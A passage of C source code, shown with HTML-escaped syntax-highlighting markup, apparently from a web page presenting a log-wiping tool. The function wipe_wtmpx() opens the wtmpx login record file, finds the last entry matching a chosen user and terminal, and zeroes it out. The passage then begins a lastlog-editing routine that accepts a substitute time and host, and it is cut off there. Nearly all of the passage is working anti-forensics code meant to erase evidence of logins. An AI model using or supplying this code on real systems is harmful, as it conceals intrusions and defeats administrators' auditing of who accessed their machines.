&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * WTMPX editing if supported.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifdef HAVE_UTMPX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_wtmpx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; 		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;utmpx&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the utmp file and temporary file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDWR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTMPX_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Determine offset of last relevent entry.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_END&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;nf&#34;&gt;bzero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  	&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * LASTLOG editing.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lastlog&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;	&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;	&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;		&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LASTLOG_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
